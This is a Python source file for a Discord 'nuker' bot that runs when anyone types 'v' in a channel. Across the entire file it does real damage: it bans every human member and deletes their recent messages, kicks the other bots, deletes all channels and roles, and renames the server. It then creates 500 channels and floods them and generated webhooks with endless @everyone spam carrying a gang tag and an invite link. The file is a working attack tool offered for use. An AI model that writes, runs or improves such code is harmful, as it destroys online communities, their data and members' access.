import discord
from discord.ext import commands
import asyncio
import os
import random
import time
import aiohttp

# ============================================
# CONFIG
# ============================================
TOKEN = input("[?] ENTER BOT TOKEN: ")

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="", intents=intents)

# ============================================
# COLORS FOR CONSOLE
# ============================================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

os.system('cls' if os.name == 'nt' else 'clear')

print(f"""
{Colors.BOLD}{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.RED}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║              ██╗  ██╗ █████╗  ██████╗     ███╗   ███╗ █████╗ ███████╗██╗  ██╗ █████╗ {Colors.RESET}
{Colors.BOLD}{Colors.RED}║              ██║  ██║██╔══██╗██╔═══██╗    ████╗ ████║██╔══██╗██╔════╝██║  ██║██╔══██╗{Colors.RESET}
{Colors.BOLD}{Colors.RED}║              ███████║███████║██║   ██║    ██╔████╔██║███████║███████╗███████║███████║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║              ██╔══██║██╔══██║██║▄▄ ██║    ██║╚██╔╝██║██╔══██║╚════██║██╔══██║██╔══██║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║              ██║  ██║██║  ██║╚██████╔╝    ██║ ╚═╝ ██║██║  ██║███████║██║  ██║██║  ██║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║              ╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝{Colors.RESET}
{Colors.BOLD}{Colors.RED}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║                    ╔═══════════════════════════════════════════════════════╗  ║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║                    ║     TYPE 'v' IN ANY CHANNEL TO DESTROY THE SERVER    ║  ║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║                    ║              FULL NUKER + WEBHOOK + SPAM             ║  ║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║                    ╚═══════════════════════════════════════════════════════╝  ║{Colors.RESET}
{Colors.BOLD}{Colors.RED}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.RED}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
""")

# ============================================
# SPAM MESSAGES
# ============================================
SPAM_MESSAGES = [
    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "@everyone **SERVER DESTROYED**",
    "```HAQ MASHA TEAM```",
    "**LIZANDIA WAS HERE**",
    "@everyone **https://discord.gg/c7cgYk4V**",
    "```TOTAL DESTRUCTION```",
    "**BYE BYE SERVER**",
    "@everyone **GET REKT**"
]

# ============================================
# WEBHOOK NAMES
# ============================================
WEBHOOK_NAMES = ["NUKER", "DESTROYER", "HAQ-MASHA", "VON-KATIBA", "LIZANDIA"]

# ============================================
# NUKE FUNCTION
# ============================================
async def full_nuke(guild, channel):
    """Full server destruction - Ban all, delete everything, webhook spam"""
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.RED}[!] NUKE STARTED ON: {guild.name}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    
    await channel.send("```🔥 VON KATIBA - FULL NUKE INITIATED 🔥```")
    
    start_time = time.time()
    
    # ============================================
    # PHASE 1: CREATE WEBHOOKS
    # ============================================
    print(f"{Colors.CYAN}[1/7] CREATING WEBHOOKS...{Colors.RESET}")
    await channel.send("**🪝 PHASE 1: CREATING WEBHOOKS**")
    
    webhooks = []
    text_channels = list(guild.text_channels)[:10]
    
    for ch in text_channels:
        for i in range(3):
            try:
                webhook = await ch.create_webhook(name=random.choice(WEBHOOK_NAMES))
                webhooks.append(webhook)
                await asyncio.sleep(0.1)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ CREATED {len(webhooks)} WEBHOOKS{Colors.RESET}")
    await channel.send(f"**✅ CREATED {len(webhooks)} WEBHOOKS**")
    
    # ============================================
    # PHASE 2: BAN ALL MEMBERS
    # ============================================
    print(f"{Colors.CYAN}[2/7] BANNING ALL MEMBERS...{Colors.RESET}")
    await channel.send("**🔨 PHASE 2: BANNING ALL MEMBERS**")
    
    members = await guild.fetch_members(limit=None).flatten()
    total_members = len([m for m in members if not m.bot])
    banned = 0
    
    for member in members:
        if not member.bot:
            try:
                await member.ban(reason="VON KATIBA HAQ MASHA", delete_message_days=7)
                banned += 1
                if banned % 20 == 0:
                    print(f"    • BANNED {banned}/{total_members}")
                await asyncio.sleep(0.03)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ BANNED {banned} MEMBERS{Colors.RESET}")
    await channel.send(f"**✅ BANNED {banned} MEMBERS**")
    
    # ============================================
    # PHASE 3: REMOVE ALL BOTS
    # ============================================
    print(f"{Colors.CYAN}[3/7] REMOVING ALL BOTS...{Colors.RESET}")
    await channel.send("**🤖 PHASE 3: REMOVING ALL BOTS**")
    
    bots_kicked = 0
    for member in members:
        if member.bot and member.id != bot.user.id:
            try:
                await member.kick(reason="VON KATIBA")
                bots_kicked += 1
                await asyncio.sleep(0.02)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ REMOVED {bots_kicked} BOTS{Colors.RESET}")
    await channel.send(f"**✅ REMOVED {bots_kicked} BOTS**")
    
    # ============================================
    # PHASE 4: DELETE ALL CHANNELS
    # ============================================
    print(f"{Colors.CYAN}[4/7] DELETING ALL CHANNELS...{Colors.RESET}")
    await channel.send("**🗑️ PHASE 4: DELETING ALL CHANNELS**")
    
    channels_deleted = 0
    for ch in guild.channels:
        try:
            await ch.delete(reason="VON KATIBA")
            channels_deleted += 1
            if channels_deleted % 50 == 0:
                print(f"    • DELETED {channels_deleted} CHANNELS")
            await asyncio.sleep(0.02)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ DELETED {channels_deleted} CHANNELS{Colors.RESET}")
    
    # ============================================
    # PHASE 5: DELETE ALL ROLES
    # ============================================
    print(f"{Colors.CYAN}[5/7] DELETING ALL ROLES...{Colors.RESET}")
    
    roles_deleted = 0
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete(reason="VON KATIBA")
                roles_deleted += 1
                await asyncio.sleep(0.02)
            except:
                pass
    
    print(f"{Colors.GREEN}    ✓ DELETED {roles_deleted} ROLES{Colors.RESET}")
    
    # ============================================
    # PHASE 6: RENAME SERVER & CREATE NEW CHANNELS
    # ============================================
    print(f"{Colors.CYAN}[6/7] RENAMING & CREATING 500 CHANNELS...{Colors.RESET}")
    
    new_name = random.choice(["VON KATIBA", "HAQ MASHA", "DESTROYED", "LIZANDIA"])
    try:
        await guild.edit(name=new_name)
        print(f"    ✓ RENAMED TO: {new_name}")
    except:
        pass
    
    # Create 500 channels
    for i in range(500):
        try:
            await guild.create_text_channel(name=f"von-katiba-{i}")
            if i % 100 == 0 and i > 0:
                print(f"    • CREATED {i} CHANNELS")
            await asyncio.sleep(0.01)
        except:
            pass
    
    print(f"{Colors.GREEN}    ✓ CREATED 500 CHANNELS{Colors.RESET}")
    
    # ============================================
    # PHASE 7: START INFINITE SPAM (CHANNELS + WEBHOOKS)
    # ============================================
    print(f"{Colors.CYAN}[7/7] STARTING INFINITE SPAM...{Colors.RESET}")
    
    # Channel spam
    async def channel_spam():
        while True:
            for ch in guild.text_channels:
                try:
                    await ch.send(random.choice(SPAM_MESSAGES))
                    await asyncio.sleep(0.05)
                except:
                    pass
            await asyncio.sleep(0.1)
    
    # Webhook spam
    async def webhook_spam():
        async with aiohttp.ClientSession() as session:
            while True:
                for webhook in webhooks:
                    try:
                        data = {
                            "content": random.choice(SPAM_MESSAGES),
                            "username": random.choice(WEBHOOK_NAMES)
                        }
                        async with session.post(webhook.url, json=data) as resp:
                            pass
                        await asyncio.sleep(0.05)
                    except:
                        pass
                await asyncio.sleep(0.1)
    
    asyncio.create_task(channel_spam())
    asyncio.create_task(webhook_spam())
    
    print(f"{Colors.GREEN}    ✓ SPAM STARTED ON {len(webhooks)} WEBHOOKS + 500 CHANNELS{Colors.RESET}")
    
    # ============================================
    # FINISH
    # ============================================
    end_time = time.time()
    total_time = round(end_time - start_time, 2)
    
    print(f"\n{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.GREEN}[✓] NUKE COMPLETED!{Colors.RESET}")
    print(f"{Colors.GREEN}    • SERVER: {guild.name}")
    print(f"{Colors.GREEN}    • BANNED: {banned} MEMBERS")
    print(f"{Colors.GREEN}    • BOTS REMOVED: {bots_kicked}")
    print(f"{Colors.GREEN}    • WEBHOOKS: {len(webhooks)}")
    print(f"{Colors.GREEN}    • CHANNELS CREATED: 500")
    print(f"{Colors.GREEN}    • TIME: {total_time} SECONDS")
    print(f"{Colors.BOLD}{Colors.MAGENTA}{'='*60}{Colors.RESET}\n")
    
    await channel.send(f"""```diff
+ ╔═══════════════════════════════════════════════════════════════╗
+ ║                                                               ║
+ ║              SERVER DESTROYED BY VON KATIBA                   ║
+ ║                                                               ║
+ ║              • BANNED: {banned} MEMBERS                      ║
+ ║              • WEBHOOKS: {len(webhooks)}                      ║
+ ║              • TIME: {total_time}s                            ║
+ ║                                                               ║
+ ║              VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH          ║
+ ║                                                               ║
+ ╚═══════════════════════════════════════════════════════════════╝
```""")

# ============================================
# ON MESSAGE - COMMAND 'v'
# ============================================
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return
    
    # Check if message is exactly 'v'
    if message.content.lower() == 'v':
        # Check if in a guild
        if message.guild:
            await full_nuke(message.guild, message.channel)
        else:
            await message.channel.send("❌ This command only works in servers!")
    
    await bot.process_commands(message)

# ============================================
# ON READY
# ============================================
@bot.event
async def on_ready():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(f"""
{Colors.BOLD}{Colors.GREEN}╔═══════════════════════════════════════════════════════════════════════════════╗{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ONLINE: {bot.user.name}{' ' * (40 - len(bot.user.name))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ BOT ID: {bot.user.id}{' ' * (44 - len(str(bot.user.id)))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              ✅ SERVERS: {len(bot.guilds)}{' ' * (43 - len(str(len(bot.guilds))))}║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              🚀 BOT IS READY!                                                  ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              📌 TYPE 'v' IN ANY CHANNEL TO DESTROY THE SERVER                 ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║              💀 FULL NUKE + WEBHOOKS + INFINITE SPAM                           ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}║                                                                               ║{Colors.RESET}
{Colors.BOLD}{Colors.GREEN}╚═══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
    """)
    
    print(f"\n{Colors.YELLOW}⚠️  BOT IS ACTIVE - TYPE 'v' IN ANY SERVER CHANNEL TO START THE NUKE{Colors.RESET}\n")

# ============================================
# RUN
# ============================================
bot.run(TOKEN)
